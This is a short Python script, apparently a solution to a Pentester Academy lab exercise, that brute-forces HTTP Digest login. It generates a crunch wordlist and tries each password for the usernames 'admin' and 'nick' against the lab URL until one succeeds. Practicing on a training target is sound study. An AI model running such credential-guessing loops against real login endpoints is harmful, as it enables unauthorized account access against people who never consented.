#!/usr/bin/python

import requests
from requests.auth import HTTPDigestAuth
import sys
from termcolor import colored

U = ["admin","nick"]

'''
Use The Following Command To Generate wordlist
#crunch 5 5 asd -o wordlist.txt
'''

p = open('wordlist.txt','r')
P = [x.strip() for x in p.readlines()]
p.close()

url_base = "http://pentesteracademylab.appspot.com/lab/webapp/digest/1"

for UserName in U:
	for Pass in P:
		Login = requests.get(url_base, auth=HTTPDigestAuth('%s'%UserName,'%s'%Pass))
		if Login.status_code == 200:
			print colored("Login with Username %s ... Password %s "%(UserName,Pass),"green")
			sys.exit(0)
		else:
			print "Login with Username %s ... Password %s ... Failed!"%(UserName,Pass)
